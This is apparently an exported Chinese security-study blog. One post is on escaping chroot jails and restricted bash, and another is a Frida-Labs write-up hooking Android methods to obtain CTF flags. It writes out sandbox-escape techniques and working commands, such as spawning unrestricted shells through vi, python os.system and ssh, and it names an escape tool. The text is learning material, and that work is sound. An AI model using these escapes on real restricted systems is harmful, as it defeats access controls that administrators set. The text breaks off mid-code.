改回默认的 Bash 或其他常用 shell。\n使用 chsh（change shell）命令更改用户的 shell：\nsudo chsh -s /bin/bash username\n\n2**.快照**\n在进行操作前对虚拟机拍摄快照，情况不对则一键还原）\n逃逸\nchroot时存在已打开的资源：\n\n对于..&#x2F;的拦截只局限于chroot中，在chroot外的文件不受它控制，所以，如果在使用chroot时正打开了一个文件，那么即使还在chroot内，chroot能用一些复杂的系统调用来利用这些之前被打开的文件，像linux里的open和execve的at变体，openat接受已被打开的资源文件描述符和一条以这个资源为起点的相对路径，所以可以执行一个相对于之前打开的文件的程序，最终这会使你逃离chroot环境。\n当前的工作目录是一个隐式开放资源，因此，当恶意代码获得控制权时，你的工作目录如果不在chroot里，会有问题。\nopenat 和 **execveat**：这些系统调用的变体允许使用一个打开的文件描述符作为基础来执行文件操作。例如：\n\nopenat(fd, &quot;../outside_directory&quot;, O_RDONLY)：可以通过 fd 指向的目录路径访问 chroot 之外的文件，前提是 fd 指向的是 chroot 外的资源。\n\nexecveat(fd, &quot;some_program&quot;, ...)：可以从 chroot 外部启动一个新的进程。\n\nchroot只能有一个\n\n\n新chroot会覆盖旧chroot。如果你在chroot环境中拥有root权限，那么你可以设置一个chroot(chroot只有特权用户能设置），用新设置的chroot覆盖之前的chroot)\n\n使用 pivot_root()\n\npivot_root() 是一个特殊的系统调用，通常用于容器和虚拟化环境，允许进程更改其根文件系统。攻击者可以尝试使用 pivot_root() 将根目录切换到 chroot 之外的目录，从而彻底逃逸。\nint ret = pivot_root(&quot;/new_root&quot;, &quot;/old_root&quot;); // 切换根目录\n\n\n未指定工作目录\n\n如果进入 chroot 时没有更改工作目录，而当前的工作目录在 chroot 外，攻击者可以通过相对路径（如 ../）导航回到 chroot 外部。工作目录是进程的一个隐式开放资源，如果未显式改变，仍然可以访问到 chroot 外的目录。\ncd ../  # 访问 chroot 之外的目录\n\n\n可使用的工具：\n\nchroot未隔离网络，使用网络下载工具然后脱离即可\nhttps://github.com/earthquake/chw00t\nchroot缺点1.chroot不提供其他形式的隔离，比如进程id\necho $$能打印当前shell的进程id\n如果杀死了当前chroot shell的进程id,相当于杀死了当前chroot环境，就能退出了\n2.chroot也不隔离网络，就算在chroot环境也能使用外面的网络，这意味着可以在chroot里下载你所需要的用来破解chroot的工具或环境\n3.容易逃离，如果你是root用户且chroot调用没有被阻塞，就可以使用“覆盖”来逃离\n4.chroot 并不是一个完全安全的隔离机制，因为它只隔离文件系统视图，不隔离文件描述符、工作目录、以及进程通信等系统资源。\nrestricted bashhttps://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html\nrbash限制以下操作：\n\n禁止切换目录：用户无法使用 cd 命令更改当前工作目录。\n禁止修改****环境变量：用户不能设置或取消设置如 SHELL、PATH、HISTFILE、ENV 等重要的环境变量。\n禁止执行带有斜杠的命令：无法使用包含斜杠的命令（如 /bin/ls），避免用户绕过限制执行系统级命令。\n禁止输出重定向：&gt;、&gt;&gt;、&amp;&gt; 等重定向符号被禁用，防止用户修改文件或输出结果。\n禁止使用 **exec**：无法用 exec 命令替换当前 shell，确保受限环境不会轻易被逃脱。\n不能关闭受限模式：用户不能通过 set +r 或其他方法禁用受限模式。\n\n正常\nlili@lili-virtual-machine:~/Desktop/myshare$ cd ..lili@lili-virtual-machine:~/Desktop$ \n\n开启rbash\nlili@lili-virtual-machine:~/Desktop/myshare$ rbashlili@lili-virtual-machine:~/Desktop/myshare$ cd ..rbash: cd: restricted\n\n逃逸1.新建另一个shell\nrbash 禁止直接执行带有斜杠的命令（如 /bin/bash），但是如果 bash 位于 PATH 目录中，用户可以直接运行 bash 或 sh 来启动一个新的、不受限制的 shell。\n\nPATH 目录的位置\n\nPATH 变量中的每个目录都用冒号（:）分隔，系统会按顺序在这些目录中查找可执行文件。常见的 PATH 目录如下：\n\n&#x2F;usr&#x2F;local&#x2F;sbin\n&#x2F;usr&#x2F;local&#x2F;bin\n&#x2F;usr&#x2F;sbin\n&#x2F;usr&#x2F;bin\n&#x2F;sbin\n&#x2F;bin\n\n效果:\n┌──(pwn㉿kali)-[/usr/bin]└─$ rbash┌──(pwn㉿kali)-[/usr/bin]└─$ cd ..                                                                                                                      rbash: cd: 受限┌──(pwn㉿kali)-[/usr/bin]└─$ bash                                                                                                                       ┌──(pwn㉿kali)-[/usr/bin]└─$ cd ..                                                                                                                      ┌──(pwn㉿kali)-[/usr]└─$       \n\n2.使用**vi,nano等编辑器逃脱**\nvi后，输入:!bash,就可以新建一个bash,该bash无限制\nlili@lili-virtual-machine:~/Desktop/myshare$ cd ..rbash: cd: restrictedlili@lili-virtual-machine:~/Desktop/myshare$ vilili@lili-virtual-machine:~/Desktop/myshare$ cd ..lili@lili-virtual-machine:~/Desktop$ \n\n3.SSH 远程命令执行\n通过 SSH 连接到服务器并直接执行一个新命令，而不会进入 rbash。例如，使用 SSH 执行 bash：\nssh user@server bash\n\n4.使用编程语言\n直接执行无法执行，但是可以使用python之类的编辑器来执行文件，test.py文件内容为print(&quot;exe a file&quot;)\n┌──(pwn㉿kali)-[~/桌面/shellcode]└─$ ./test.pyrbash: ./test.py: 受限：无法在命令名中使用 &quot;/&quot;┌──(pwn㉿kali)-[~/桌面/shellcode]└─$ python test.py                                                                                                             exe a file\n\n执行bash\npython -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;\n\n效果\n┌──(pwn㉿kali)-[~/桌面/shellcode]└─$ cd ..                                                                                                                      rbash: cd: 受限┌──(pwn㉿kali)-[~/桌面/shellcode]└─$ python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;                                                                              ┌──(pwn㉿kali)-[~/桌面/shellcode]└─$ cd ..                                                                                                                      ┌──(pwn㉿kali)-[~/桌面]└─$         \n\nchroot+rbasn要点\n\nchroot 创建隔离的文件系统\n\nchroot 将用户的根目录限制在一个指定的文件系统，使得用户无法访问系统的其余部分。即使用户尝试访问 /，实际上访问的也是 chroot jail 内部的文件\n\nrbash 限制用户操作\n\nrbash（受限 Bash）进一步限制用户对文件系统和系统命令的操作，禁止更改目录、修改环境变量、使用重定向等。将用户的 shell 设置为 rbash，可以防止用户在 chroot jail 中逃脱出来或执行非预期的操作。\n防范措施（反逃逸)基本上就是和前面的“逃逸”反着来，能使用python就禁用python，能使用编辑器就禁用编辑器\n参考资料pwn.college - Sandboxing - chroot\nhttps://atum.li/2017/04/25/linuxsandbox/#chroot-jail\nhttps://www.baeldung.com/linux/sandboxing-process\n"},{"title":"Frida-Labs wp","url":"/2025/04/17/Frida-Labs-wp/","content":"0x1 同一个类中的静态方法分析基本结构如下\npublic class MainActivity extends AppCompatActivity &#123;    protected void onCreate(Bundle bundle) &#123;            public void onClick(View view) &#123;                if (TextUtils.isDigitsOnly(obj)) &#123;                    MainActivity.this.check(i, Integer.parseInt(obj));                &#125;             &#125;        &#125;);    &#125;    void check(int i, int i2) &#123;        if ((i * 2) + 4 == i2) &#123;&#125;&#125;\n\n满足check的逻辑就可以，i2=i*2+4这里的check方法会主动触发，不需要额外调用，在这里，只需要更改原来check的逻辑就可以了\n方法一以下代码的编写是在jadx里直接“复制为frida片段”获得\nsetTimeout(function() &#123;    Java.perform(function() &#123;        console.log(&quot;hookTest1 is called&quot;);        let MainActivity = Java.use(&quot;com.ad2001.frida0x1.MainActivity&quot;);        MainActivity[&quot;check&quot;].implementation = function (i, i2) &#123;            console.log(`MainActivity.check is called: i=$&#123;i&#125;, i2=$&#123;i2&#125;`);            i2=i*2+4;  //在这里定义i2            console.log(`i2 is changed to $&#123;i2&#125;`);            this[&quot;check&quot;](i, i2);        &#125;;    &#125;);&#125;, 0);\n\n方法二以下代码调用Frida 的 JavaScript API。onMatch: function (instance) { … }该回调函数会在每次找到 className 指定的类的实例时被调用。nComplete: function () { … }\n\n这个回调函数在 Frida 完成了对所有目标进程的内存扫描，并且枚举完所有 className 指定的类的实例之后被调用。\n可以在 onComplete 函数中执行一些清理工作，或者打印一些总结信息。onComplete: function () {}，这意味着在枚举完成之后什么也不做。Java.choose(&quot;com.ad2001.frida0x1.MainActivity&quot;, &#123;    onMatch: function (instance) &#123;        console.log(&quot;[+] 找到 MainActivity 实例，自动触发解密&quot;);        instance.check(0, 4); // 传入 i=0, i2=4    &#125;,    onComplete: function () &#123;&#125;&#125;);\n\n方法三a.check.overload(‘int’, ‘int’).implementation &#x3D; function(a, b) { … }\n\n.overload(‘int’, ‘int’): 指定要 hook 的 check 方法的重载版本。 check 方法可能存在多个重载版本，’int’, ‘int’ 表示选择接受两个 int 类型参数的版本。 这很重要，因为如果方法有多个重载，你必须明确指定要 hook 的版本。\n.implementation &#x3D; function(a, b) { … }: 设置 hook 的具体实现。 你在这里定义的函数将会在每次调用被 hook 的 check 方法时被执行。\nthis.originalMethod() 用于调用原始的方法（如果需要）Java.perform(function() &#123;  var a = Java.use(&quot;com.ad2001.frida0x1.MainActivity&quot;);  a.check.overload(&#x27;int&#x27;, &#x27;int&#x27;).implementation = function(a, b) &#123;    this.check(4, 12);  &#125;&#125;);\n\n0x2 主动调用同一个类中的静态方法主要逻辑\npublic class MainActivity extends AppCompatActivity &#123;    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(C0497R.layout.activity_main);        f103t1 = (TextView) findViewById(C0497R.id.textview);    &#125;    public static void get_flag(int a) &#123;        if (a == 4919) &#123;               &#125;&#125;\n\n这次目标方法不再原本的程序流程内，需要额外进行调用java.choose和在jadx直接赋值frida片段都是调用的实例化对象，而get_flag没有被实例化\nJava.choose 只能找到已经实例化的对象,所以这个代码不行\nJava.choose(&quot;com.ad2001.frida0x2.MainActivity&quot;,&#123;    onMatch:function(instance)&#123;        instance.get_flag(4919);    &#125;    ,onComplete:function()&#123;&#125;&#125;);\n\n\n方法一Frida 的 Java.use 返回的类包装器对象（这里是 MainActivity）直接暴露了其静态成员（包括方法和字段），允许你像访问普通 JavaScript 对象的属性一样访问和调用它们。（它看起来非常像你在 Java 中直接编写 MainActivity.get_flag(4919);）这个方法隐式的处理了上下文的关系，比方法二更简洁.&lt;方法&gt;\nJava.perform(function() &#123;    var a = Java.use(&quot;com.ad2001.frida0x2.MainActivity&quot;);&#125;)\n\n那么实际操作就是\nJava.perform(function() &#123;        var a = Java.use(&quot;com.ad2001.frida0x2.MainActivity&quot;);\t\ta.get_flag(4919);&#125;)\n\n方法二核心是调用.call方法，此代码也可行\nJava.perform(function()&#123;    var MainActivity = Java.use(&quot;com.ad2001.frida0x2.MainActivity&quot;);\tconsole.log(&quot;[*] 主动调用。。。&quot;);\tMainActivity.get_flag.call(MainActivity, 4919);&#125;);\n调用静态方法时，.call 的第一个参数是类包装器；调用实例方法时，.call 的第一个参数是实例对象\n\n对于 Java 的静态方法，它们不依赖于任何特定的对象实例，它们属于类本身。当你在 Frida 中使用 .call() 调用一个静态 Java 方法时，你需要提供一个上下文。按照约定和实现，将类包装器本身 (MainActivity) 作为 this 上下文传递给 call 是正确的做法，它告诉 Frida 这个方法调用是针对这个类的静态上下文。\n\n0x3同一个包下的不同类分析\npackage com.ad2001.frida0x3;public class MainActivity extends AppCompatActivity &#123;            public void onClick(View v) &#123;                if (Checker.code == 512) &#123;&#125;&#125;&#125;\ncheck类\npackage com.ad2001.frida0x3;public class Checker &#123;    static int code = 0;    public static void increase() &#123;        code += 2;    &#125;&#125;\n\n这里的check不再和主方法在一个类，但是在它的运行逻辑中因此不需要主动调用，只需要更改它本身逻辑(这里可以对照0x1的方法三)\n思路一循环调用checker的increase()方法来递增值\nJava.perform(function() &#123;    var Checker = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);    console.log(&quot;code当前值为&quot;+Checker.code.value);        Checker.code.value=0;    for(var i=0;i&lt;256;i++)&#123;        Checker.increase();    &#125;    console.log(&quot;触发函数后的值为&quot;+Checker.code.value);  &#125;);\n\n\n思路二把code直接改成512修改值的模板如下\nJava.perform(function ()&#123;    var &lt;class_reference&gt; = Java.use(&quot;&lt;package_name&gt;.&lt;class&gt;&quot;);    &lt;class_reference&gt;.&lt;variable&gt;.value = &lt;value&gt;;&#125;)\n\n最终实现\nJava.perform(function ()&#123;    var a = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);  // class reference    a.code.value = 512;&#125;)\n\n\n0x4 实例化mainactivity\npackage com.ad2001.frida0x4;public class MainActivity extends AppCompatActivity &#123;    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(C0497R.layout.activity_main);        this.f103t1 = (TextView) findViewById(C0497R.id.txtview);    &#125;&#125;\ncheck\npackage com.ad2001.frida0x4;public class Check &#123;    public String get_flag(int a) &#123;        if (a == 1337) &#123;            &#125;            return new String(decoded);        &#125;        return &quot;&quot;;    &#125;&#125;\n\n这次需要进行实例化$new（）\n模板\nJava.perform(function() &#123;  var &lt;class_reference&gt; = Java.use(&quot;&lt;package_name&gt;.&lt;class&gt;&quot;);  var &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); // Class Object  &lt;class_instance&gt;.&lt;method&gt;(); // Calling the method&#125;)\n\n使用效果这样就可以在控制台打印flag\nJava.perform(function() &#123;  var check = Java.use(&quot;com.ad2001.frida0x4.Check&quot;);  var check_obj = check.$new(); // Class Object  var res = check_obj.get_flag(1337); // Calling the method  console.log(&quot;FLAG &quot; + res);&#125;)\n\n这个将会直接调用新的实例化后的静态方法，传入值然后直接解密，和MainActivity没关系了\n0x5 有上下文的实例化主要逻辑\npackage com.ad2001.frida0x5;public class MainActivity extends AppCompatActivity &#123;    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(C0497R.layout.activity_main);        this.f103t1 = (TextView) findViewById(C0497R.id.textview);    &#125;    public void flag(int code) &#123;        if (code == 1337) &#123;        \t        this.f103t1.setText(decryptedText);                    &#125;    &#125;&#125;\n\n看起来可以模仿0x1的方法二Java.choose(&quot;com.ad2001.frida0x5.MainActivity&quot;,&#123;    onMatch:function(instance)&#123;        console.log(&quot;[+] 找到实例，自动触发解密&quot;);        instance.flag(1337);    &#125;,    onComplete:function()&#123;&#125;&#125;);\n但是出现了报错,报错如下：\n[Pixel 4::Frida 0x5 ]-&gt;Error: java.lang.ClassNotFoundException: Didn&#x27;t find class &quot;com.ad2001.frida0x5.MainActivity&quot; on path: DexPathList[[directory &quot;.&quot;],nativeLibraryDirectories=[/system/lib64, /product/lib64, /system/lib64, /product/lib64]]           at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:115)    at apply (native)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:97)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:488)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:949)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:954)    at _make (frida/node_modules/frida-java-bridge/lib/class-factory.js:165)    at use (frida/node_modules/frida-java-bridge/lib/class-factory.js:62)    at _chooseObjectsArtPreA12 (frida/node_modules/frida-java-bridge/lib/class-factory.js:335)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:303)    at kt (frida/node_modules/frida-java-bridge/lib/android.js:586)Error: java.lang.ClassNotFoundException: Didn&#x27;t find class &quot;com.ad2001.frida0x5.MainActivity&quot; on path: DexPathList[[directory &quot;.&quot;],nativeLibraryDirectories=[/system/lib64, /product/lib64, /system/lib64, /product/lib64]]           at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:115)    at apply (native)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:97)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:488)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:949)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:954)    at _make (frida/node_modules/frida-java-bridge/lib/class-factory.js:165)    at use (frida/node_modules/frida-java-bridge/lib/class-factory.js:62)    at _chooseObjectsArtPreA12 (frida/node_modules/frida-java-bridge/lib/class-factory.js:335)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/class-factory.js:303)    at kt (frida/node_modules/frida-java-bridge/lib/android.js:586)\n\n原因如下；因为 flag 方法内部执行了 this.f103t1.setText()，这是一个 UI 操作。UI 操作必须在 Android 的主线程（UI 线程）执行。 因此，你需要将调用包装在 Java.scheduleOnMainThread 中，否则可能会遇到 CalledFromWrongThreadException 错误。改进后的脚本Hook 一个晚期方法: Hook 一个已知在 MainActivity 加载后肯定会执行的方法（例如 Activity.onResume），然后在该 Hook 内部执行 Java.choose\nJava.perform(function () &#123;\tvar activityClass = &quot;com.ad2001.frida0x5.MainActivity&quot;;\tvar hookInstalled = false;\t// 尝试 Hook Activity 的 onResume\ttry &#123;\t\tvar Activity = Java.use(&quot;android.app.Activity&quot;);\t\tActivity.onResume.implementation = function () &#123;\t\t\tconsole.log(&quot;[*] Activity.onResume() called. Target class should be loaded.&quot;);\t\t\t// 只执行一次 Java.choose\t\t\tif (!hookInstalled) &#123;\t\t\t\thookInstalled = true; // 防止重复执行 choose\t\t\t\tJava.choose(activityClass, &#123;\t\t\t\t\tonMatch: function (instance) &#123;\t\t\t\t\t\tconsole.log(&quot;[+] Found instance: &quot; + instance + &quot; via onResume hook.&quot;);\t\t\t\t\t\tJava.scheduleOnMainThread(function () &#123;\t\t\t\t\t\t\tconsole.log(&quot;[*] Calling instance.flag(1337) on main thread...&quot;);\t\t\t\t\t\t\tinstance.flag(1337);\t\t\t\t\t\t&#125;);\t\t\t\t\t\t// return &#x27;stop&#x27;; // 如果只需要一个实例\t\t\t\t\t&#125;,\t\t\t\t\tonComplete: function () &#123;\t\t\t\t\t\tconsole.log(&quot;[*] Java.choose search complete (triggered from onResume).&quot;);\t\t\t\t\t&#125;\t\t\t\t&#125;);\t\t\t&#125;\t\t\t// 调用原始的 onResume 方法\t\t\tthis.onResume();\t\t&#125;;\t\tconsole.log(&quot;[*] Hook installed on Activity.onResume. Waiting for activity to resume...&quot;);\t&#125; catch (e) &#123;\t\tconsole.error(&quot;[-] Failed to hook Activity.onResume: &quot; + e);\t\tconsole.error(&quot;[-] Falling back to simple setTimeout...&quot;);\t\t// 如果 Hook 失败 (例如权限问题)，回退到 setTimeout\t\tsetTimeout(function () &#123; /* ... setTimeout code from above ... */ &#125;, 3000);\t&#125;&#125;);\n\n\n\n\n\n\n看起来可以模仿0x2Java.perform(function () &#123;    var a = Java.use(&quot;com.ad2001.frida0x5.MainActivity&quot;);    a.flag(1337);&#125;)\n\n但是出现了报错，报错如下：\n[Pixel 4::Frida 0x5 ]-&gt; Error: flag: cannot call instance method without an instance    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:3)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:4)Error: flag: cannot call instance method without an instance    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:3)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:4)\n\n0x5和0x2的区别在于一个是public void flag(int code)而另一个是静态方法public static void get_flag(int a)  （差了一个static）如果把0x5当成静态方法来处理那么就会出现很多的报错\n看起来可以模仿0x4那么现在就需要调用实例化方法在0x4我们为了调用get_flag实例化了Check类\npackage com.ad2001.frida0x4;public class Check &#123;    public String get_flag(int a) &#123;        if (a == 1337) &#123;            &#125;            return new String(decoded);        &#125;        return &quot;&quot;;    &#125;&#125;\n那么现在为了调用flag我们要调用MainActivity类吗\npackage com.ad2001.frida0x5;public class MainActivity extends AppCompatActivity &#123;    public void flag(int code) &#123;        if (code == 1337) &#123;                    &#125;    &#125;&#125;\n\n\n这个代码是调用MainActivity的\nJava.perform(function () &#123;\tlet MainActivity = Java.use(&quot;com.ad2001.frida0x5.MainActivity&quot;);\tvar main = MainActivity.$new();\tmain.flag(1337);&#125;);\n它出现的报错是\n[Pixel 4::Frida 0x5 ]-&gt; Error: flag: cannot call instance method without an instance    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:3)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:4)Error: flag: cannot call instance method without an instance    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:3)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:4)Error: java.lang.RuntimeException: Can&#x27;t create handler inside thread Thread[Thread-6,10,main] that has not called Looper.prepare()    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1237)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:643)    at apply (native)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1141)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:4)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:7)Error: java.lang.RuntimeException: Can&#x27;t create handler inside thread Thread[Thread-7,10,main] that has not called Looper.prepare()    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1237)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:643)    at apply (native)    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1141)    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:4)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:7)\n\n为什么不能实例化MainActivity?由于 Android 的生命周期和线程规则，直接使用 Frida 创建 MainActivity 或任何 Android 组件的实例可能很棘手。Android 组件（如 Activity 子类）依赖于应用程序上下文才能正常运行。在 Frida 中，您可能缺少必要的上下文。Android UI 组件通常需要具有关联 Looper 的特定线程。如果您正在处理 UI 任务，请确保您位于具有活动 Looper 的主线程上。Activity 是更大的 Android 应用程序生命周期的一部分。创建 MainActivity 的实例可能需要应用程序处于特定状态，并且通过 Frida 管理整个生命周期可能并不简单。总之，为 MainActivity 创建实例不是一个好主意。这里的解决方法是：当 Android 应用程序启动时，系统会创建 MainActivity 的实例（或在 AndroidManifest.xml 文件中指定的启动器 Activity）。MainActivity 实例的创建是 Android 应用程序生命周期的一部分。因此，我们只需使用 frida 来获取 MainActivity 的实例，然后调用 flag（） 方法来获取我们的标志。\n在这里介绍一个新的模板在现有实例上调用方法Java.performNow ：用于在 Java 运行时的上下文中执行代码的函数。Java.choose：在运行时枚举指定 Java 类（作为第一个参数提供）的实例。\nJava.performNow(function() &#123;  Java.choose(&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;, &#123;    onMatch: function(instance) &#123;      // TODO    &#125;,    onComplete: function() &#123;&#125;  &#125;);&#125;);\nonMatch:onMatch 回调函数针对在 Java.choose作期间找到的指定类的每个实例执行。该回调函数接收当前实例作为其参数。可以在 onMatch 回调中定义要对每个实例执行的自定义操作。onComplete 回调在 Java.choose作完成后执行作或清理任务。此块是可选的，如果您在搜索完成后不需要执行任何特定作，则可以选择将其留空。\n实际操作如下\nJava.performNow(function() &#123;  Java.choose(&#x27;com.ad2001.frida0x5.MainActivity&#x27;, &#123;      onMatch: function(instance) &#123; // &quot;instance&quot; is the instance for the MainActivity        console.log(&quot;Instance found&quot;);        instance.flag(1337); // Calling the function    &#125;,    onComplete: function() &#123;&#125;  &#125;);&#125;);\n\n0x6 实例字段主要逻辑如下MainActivity\npackage com.ad2001.frida0x6;public class MainActivity extends AppCompatActivity &#123;    protected void onCreate(Bundle savedInstanceState) &#123;    &#125;    public void get_flag(Checker A) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;        if (1234 == A.num1 &amp;&amp; 4321 == A.num2) &#123;                   &#125;    &#125;&#125;\nChecker\npackage com.ad2001.frida0x6;public class Checker &#123;    int num1;    int num2;&#125;\n\n\n这次get_flag获取的参数是Checker类，而现在要修改的是类中定义的数所以现在要做的是，实例化，修改值，调用get_flag()\n看起来可以模仿0x3Java.perform(function ()&#123;    var check = Java.use(&quot;com.ad2001.frida0x6.Checker&quot;);  // class reference    check.num1.value = 1234;    check.num2.value = 4321;&#125;)\n报错如下\nError: Cannot access an instance field without an instance    at set (frida/node_modules/frida-java-bridge/lib/class-factory.js:1321)    at &lt;anonymous&gt; (D:\\anquan_question\\frida\\test.js:3)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)    at perform (frida/node_modules/frida-java-bridge/index.js:204)    at &lt;eval&gt; (D:\\anquan_question\\frida\\test.js:7)\n\n依旧是实例和静态的问题0x3是static int code = 0;0x6是int num1;不能在一个类上直接访问或修改属于实例的字段。需要先创建一个 Checker 类的对象（实例），然后才能访问或修改那个特定对象的 num1 和 num2 字段。\n实例化，修改值，调用get_flag()现在需要实例化一个类\nvar Checker = Java.use(&quot;com.ad2001.frida0x6.Checker&quot;);var check = Checker.$new();\n然后修改它的值(参照0x3)\ncheck.num1.value = 1234;check.num2.value = 4321;\n为了实例化调用get_flag,参照0x5使用框架\nJava.performNow(function() &#123;  Java.choose(&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;, &#123;    onMatch: function(instance) &#123;      // TODO    &#125;,    onComplete: function() &#123;&#125;  &#125;);&#125;);\n\n\n实际操作如下\nJava.performNow(function () &#123;    Java.choose(&#x27;com.ad2001.frida0x6.MainActivity&#x27;, &#123;        onMatch: function (instance) &#123;\t\t\tvar Checker = Java.use(&quot;com.ad2001.frida0x6.Checker&quot;);            var check = Checker.$new();            check.num1.value = 1234;            check.num2.value = 4321;            console.log(&quot;get_flag called&quot;);            instance.get_flag(check);        &#125;,        onComplete: function () &#123; &#125;    &#125;);&#125;);\nJava.perform vs Java.performNow 的影响: 对于这个特定的场景，Java.choose 本身就是一个需要等待匹配的操作，其 onMatch 回调是异步触发的。无论外层是 perform 还是 performNow，Java.choose 都能被正确地启动。\n0x7 构造函数(Constructor)主要逻辑\npackage com.ad2001.frida0x7;public class MainActivity extends AppCompatActivity &#123;    protected void 